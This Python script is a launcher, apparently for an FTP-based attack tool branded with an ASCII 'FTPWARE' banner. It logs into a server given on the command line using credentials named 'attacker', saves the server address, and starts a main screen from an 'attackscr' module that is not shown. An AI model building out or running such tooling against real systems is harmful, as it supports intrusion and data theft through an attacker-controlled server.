from ftplib import FTP
import contextlib
from attackscr import *
import sys
from datetime import datetime
from colorama import Fore
import time

def spinning_cursor():
    while True:
        yield from '|/-\\'

spinner = spinning_cursor()
print(Fore.RED+ """ 
 █████▒▄▄▄█████▓ ██▓███   █     █░ ▄▄▄       ██▀███  ▓█████   
▓██   ▒ ▓  ██▒ ▓▒▓██░  ██▒▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ 
▒████ ░ ▒ ▓██░ ▒░▓██░ ██▓▒▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   
░▓█▒  ░ ░ ▓██▓ ░ ▒██▄█▓▒ ▒░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ 
░▒█░      ▒██▒ ░ ▒██▒ ░  ░░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
 ▒ ░      ▒ ░░   ▒▓▒░ ░  ░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
 ░          ░    ░▒ ░       ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
 ░ ░      ░      ░░         ░   ░    ░   ▒     ░░   ░    ░   
                              ░          ░  ░   ░        ░  ░"""+ Fore.CYAN)
print(f"© Aryan Chaudhari 2023{Fore.RESET}")
if len(sys.argv) < 2:
    print(
        f'{Fore.RED}[{datetime.now().strftime("%H:%M:%S")}] Error: No ftp server provided, exiting...{Fore.RESET}'
    )
    raise SystemExit
print(
    f'{Fore.YELLOW}[{datetime.now().strftime("%H:%M:%S")}] Checking ftp server availability... {Fore.CYAN}',
    end="",
)
sys.stdout.write(next(spinner))
try:
    server = FTP(sys.argv[1],'attacker','attackerpass1234')
    valid = True
    with contextlib.suppress(Exception):
        __import__("os").remove("server")
    with open("server", "x") as f:
        f.write(sys.argv[1])
except Exception:
    valid=False
sys.stdout.flush()
sys.stdout.write('\b')
for _ in range(50):
    sys.stdout.write(next(spinner))
    sys.stdout.flush()
    time.sleep(0.1)
    sys.stdout.write('\b')
if valid:
    print(f"{Fore.GREEN}done")
    time.sleep(2)
    print(Fore.RESET)
else:
    print(f"{Fore.RED}error")
    time.sleep(1)
    print(
        f'{Fore.RED}[{datetime.now().strftime("%H:%M:%S")}] Error: FTP server refused to connect{Fore.RESET}'
    )
    print(Fore.RESET)
    raise SystemExit
if __name__ == "__main__":
    app = mainscr()
    app.run()